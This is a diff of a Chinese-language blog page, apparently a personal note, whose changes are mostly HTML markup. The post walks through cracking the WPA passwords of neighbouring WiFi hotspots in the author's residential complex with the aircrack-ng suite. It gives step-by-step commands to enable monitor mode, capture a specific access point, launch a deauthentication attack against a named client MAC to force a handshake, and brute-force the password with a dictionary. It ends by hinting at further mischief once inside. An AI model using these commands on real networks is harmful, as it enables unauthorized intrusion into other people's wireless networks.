@@ -73,6 +73,7 @@
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="crackWifiPasswd">
 <meta name="twitter:description" content="无线破解声明: 仅作研究的一个笔记。 在小区内有很多的wifi热点, 正好手头有一个无线网卡, 尝试破解wifi密码。">
+<meta name="twitter:image" content="http://ww4.sinaimg.cn/mw690/63fe561egw1f1159fnr4lj214c0c8q60.jpg">
 
 
 
@@ -313,30 +314,30 @@
       
 
       
-        <h3 id="无线破解">无线破解</h3><p>声明: 仅作研究的一个笔记。 在小区内有很多的wifi热点, 正好手头有一个无线网卡, 尝试破解wifi密码。</p>
+        <h3 id="无线破解"><a href="#无线破解" class="headerlink" title="无线破解"></a>无线破解</h3><p>声明: 仅作研究的一个笔记。 在小区内有很多的wifi热点, 正好手头有一个无线网卡, 尝试破解wifi密码。</p>
 <a id="more"></a>
-<h3 id="背景知识">背景知识</h3><p>常用的wifi加密web、wpa、wpa2, wifi破解屌爆了的工具aircrack-ng, 密码字典。</p>
-<h3 id="破解实战">破解实战</h3><ol>
+<h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>常用的wifi加密web、wpa、wpa2, wifi破解屌爆了的工具aircrack-ng, 密码字典。</p>
+<h3 id="破解实战"><a href="#破解实战" class="headerlink" title="破解实战"></a>破解实战</h3><ol>
 <li>将无线网卡处于混杂模式（能够监听周围通过网卡的数据）<a href="https://zh.wikipedia.org/wiki/%E6%B7%B7%E6%9D%82%E6%A8%A1%E5%BC%8F" target="_blank" rel="external">是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它</a></li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airmon-ng</div></pre></td></tr></table></figure>
 <p><img src="http://ww4.sinaimg.cn/mw690/63fe561egw1f1159fnr4lj214c0c8q60.jpg" alt=""></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airmon-ng start wlan0</div></pre></td></tr></table></figure>
 <p><img src="http://ww3.sinaimg.cn/mw690/63fe561egw1f115chobo8j214w0matgn.jpg" alt=""></p>
 <p><code>回显的时候 提示有些存在的进程可能会影响airodump正常工作，确保正常工作，需要执行一下命令</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng check <span class="built_in">kill</span> all</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwconfig wlan0mon <span class="comment"># 查看网卡是否处于混杂模式</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng waln0mon <span class="comment"># 查看周围的无线网络</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airmon-ng check <span class="built_in">kill</span> all</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iwconfig wlan0mon <span class="comment"># 查看网卡是否处于混杂模式</span></div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airodump-ng waln0mon <span class="comment"># 查看周围的无线网络</span></div></pre></td></tr></table></figure>
 <p><img src="http://ww1.sinaimg.cn/large/63fe561egw1f115lckxtdj21e80nkam7.jpg" alt=""></p>
 <p><strong>语法:airodump-ng –channel [x] –bssid [bssid] –write [filename] [interface?mon0]</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng  -w qiu --bssid FC:D7:<span class="number">33</span>:<span class="number">82</span>:<span class="number">5</span>B:<span class="number">10</span> wlan0mon</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airodump-ng  -w qiu --bssid FC:D7:33:82:5B:10 wlan0mon</div></pre></td></tr></table></figure>
 <p><code>再开一个终端, 模拟客户端mac, 进行网络洪水攻击, 直到抓到重连握手包</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">10</span> --ignore-negative-one  <span class="operator">-a</span>  FC:D7:<span class="number">33</span>:<span class="number">82</span>:<span class="number">5</span>B:<span class="number">10</span>  -c <span class="number">2</span>C:BE:<span class="number">08</span>:<span class="number">7</span>B:<span class="number">81</span>:<span class="number">48</span>  wlan0mon</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w WPA字典.txt qiu-*.cap</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aireplay-ng -0 10 --ignore-negative-one  <span class="_">-a</span>  FC:D7:33:82:5B:10  -c 2C:BE:08:7B:81:48  wlan0mon</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aircrack-ng -w WPA字典.txt qiu-*.cap</div></pre></td></tr></table></figure>
 <p><img src="http://ww2.sinaimg.cn/mw690/63fe561egw1f13jd6q1o7j217o0wgwpo.jpg" alt=""></p>
 <p><strong>!hack the passwd</strong></p>
-<h3 id="后记">后记</h3><p>抓到wifi的握手包之后，就是跑密码字典了，精心设计密码字典，就会事半功倍！破解wifi之后，还有更多好玩的东西！</p>
-<h3 id="参考文献">参考文献</h3><p><a href="http://www.freebuf.com/articles/wireless/59809.html" target="_blank" rel="external">http://www.freebuf.com/articles/wireless/59809.html</a></p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>抓到wifi的握手包之后，就是跑密码字典了，精心设计密码字典，就会事半功倍！破解wifi之后，还有更多好玩的东西！</p>
+<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="http://www.freebuf.com/articles/wireless/59809.html" target="_blank" rel="external">http://www.freebuf.com/articles/wireless/59809.html</a></p>
 <p><a href="http://aircrack-ng.org/documentation.html" target="_blank" rel="external">http://aircrack-ng.org/documentation.html</a></p>
 <p><a href="http://www.aircrack-ng.org/doku.php?id=cracking_wpa" target="_blank" rel="external">http://www.aircrack-ng.org/doku.php?id=cracking_wpa</a></p>
 <p><a href="https://sweetll.me/2014/11/ubuntu-14-10-%E5%AF%B9%E4%BA%8Ewifi%E5%AF%86%E7%A0%81%E7%9A%84%E7%A0%B4%E8%A7%A3%E7%A0%94%E7%A9%B6-%E4%BB%A5%E5%8F%8A%E7%A0%B4%E8%A7%A3wifi%E5%90%8E%E8%83%BD%E5%B9%B2%E4%BB%80%E4%B9%88/" target="_blank" rel="external">https://sweetll.me</a></p>
